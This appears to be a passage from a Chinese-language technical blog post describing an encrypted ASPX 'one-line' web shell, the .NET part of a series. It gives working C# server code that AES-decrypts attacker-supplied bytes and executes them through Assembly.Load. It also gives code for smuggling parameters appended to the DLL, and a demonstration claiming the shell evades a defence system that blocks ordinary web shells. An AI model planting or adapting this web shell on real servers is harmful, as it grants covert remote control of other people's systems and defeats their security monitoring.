        byte[] key = Encoding.Default.GetBytes(Session[0] + "");
        byte[] content = Request.BinaryRead(Request.ContentLength);
        byte[] decryptContent = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(key, key).TransformFinalBlock(content, 0, content.Length);
        System.Reflection.Assembly.Load(decryptContent).CreateInstance("Payload").Equals(this);
    %>
为了增加可读性，我对上述代码做了一些扩充，简化一下就是下面这一行：
当然如果去掉动态加密而只实现传统一句话木马的功能的话，可以再精简一下，如下：
至此，具有动态解密功能的、能解析执行任意二进制流的新型aspx一句话木马就完成了。
### 客户端实现
由于Java、.net、php三个版本是公用一个客户端，且其中多个模块可以实现复用，为了节省篇幅，此处就不再介绍重叠的部分，只针对.net平台特异化的部分介绍一下。
##### 1\. 远程获取加密密钥
详细请参考《利用动态二进制加密技术实现新型一句话木马之Java篇》。
##### 2\. 动态生成二进制字节数组
为了实现客户端跨平台使用，我们的客户端采用Java语言编写，因此就无法动态编译C#的dll文件。而是在windows平台把C#版本的Payload编译成dll文件，然后以资源文件的形式嵌入至客户端。
##### 3\. 已编译类的参数化
既然上文已经提及，我们无法在Java环境中去动态修改.net的类文件来动态修改Payload中的参数。那我们就只能在Payload本身代码中想办法了。  
.NET的System.Reflection.Assembly.Load在解析COFF可执行文件时有一个特性，那就是它在解析时会自动忽略COFF文件尾部附加的额外数据。聪明的你应该想到怎么样把参数动态传到Payload了。
请看下图：
  * 客户端把参数值拼接在DLL文件的底部，然后一起进行AES加密，加密之后传递到服务端。
  * 服务端收到加密字节流之后进行AES解密，并把解密的内容（包括DLL字节流和参数字节流）传入System.Reflection.Assembly.Load，由于Assembly的解析特性，会自动忽略掉DLL文件尾部的额外参数字节流。
  * 执行流进入Payload的Equals函数，在函数中由于可以访问Request和Session，于是用Session中的key对Requset中的完整加密字节流再次解密。
  * 解密得到DLL文件字节流和额外参数字节流，然后只要把DLL尾部附加的额外参数字节流取出来，便可得到客户端传过来的额外参数。
服务端取参数的实现代码如下：
    private void fillParams()
        {
            this.Request.InputStream.Seek(0, 0);
            byte[] fullData = Request.BinaryRead(Request.ContentLength);
            byte[] key = System.Text.Encoding.Default.GetBytes(Session[0] + "");
            fullData = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(key, key).TransformFinalBlock(fullData, 0, fullData.Length);
            Dictionary extraMap = getExtraData(fullData);
            if (extraMap != null)
            {
                foreach (var f in extraMap)
                {
                    this.GetType().GetField(f.Key).SetValue(this, f.Value);
                }
            }
        }
    private Dictionary getExtraData(byte[] fullData)
        {
            Request.InputStream.Seek(0, 0);
            int extraIndex = IndexOf(fullData, new byte[] { 0x7e, 0x7e, 0x7e, 0x7e, 0x7e, 0x7e });
            byte[] extraData = new List(fullData).GetRange(extraIndex + 6, fullData.Length - extraIndex - 6).ToArray();
            String extraStr = System.Text.Encoding.Default.GetString(extraData);
            System.Web.Script.Serialization.JavaScriptSerializer serializer = new System.Web.Script.Serialization.JavaScriptSerializer();
            Dictionary extraMap = serializer.Deserialize>(extraStr);
            return extraMap;
        }
    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
        {
            int count = 0;
            if (srcBytes == null) { return -1; }
            if (searchBytes == null) { return -1; }
            if (srcBytes.Length == 0) { return -1; }
            if (searchBytes.Length == 0) { return -1; }
            if (srcBytes.Length < searchBytes.Length) { return -1; }
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1) { return i; }
                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }
                    if (flag)
                    {
                        count++;
                        if (count == 2)
                            return i;
                    }
                }
            }
            return -1;
        }
通过这种方式，我们就可以在Java环境中动态获取参数化的DLL字节流。
##### 4\. 加密payload
详细请参考《利用动态二进制加密技术实现新型一句话木马之Java篇》。
##### 5\. 发送payload，接收执行结果并解密。
详细请参考《利用动态二进制加密技术实现新型一句话木马之Java篇》。
## 案例演示
下面我找了一个测试站点来演示一下绕过防御系统的效果：  
首先我上传一个常规的aspx一句话木马，然后用菜刀客户端连接，如下图，连接直接被防御系统reset了：
然后上传我们的新型一句话木马，并用响应的客户端连接，可以成功连接并管理目标系统：
本篇完。